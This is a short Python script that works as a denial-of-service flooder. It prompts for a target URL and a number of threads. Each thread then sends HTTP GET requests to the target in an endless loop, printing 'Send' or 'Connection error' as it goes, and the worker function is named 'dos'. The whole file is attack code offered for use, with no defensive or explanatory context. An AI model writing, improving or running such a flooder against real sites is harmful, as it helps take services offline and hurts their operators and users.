import requests
from threading import Thread
from termcolor import colored

url = input('url: ')
threads = int(input('threads: '))

def dos(url):
    while True:
        try:
            requests.get(url)
            print(colored('Send ' + url,'green'))
        except:
            print(colored('Connection error','red'))

for i in range(0,threads):
    thr = Thread(target=dos, args=(url,))
    thr.start()

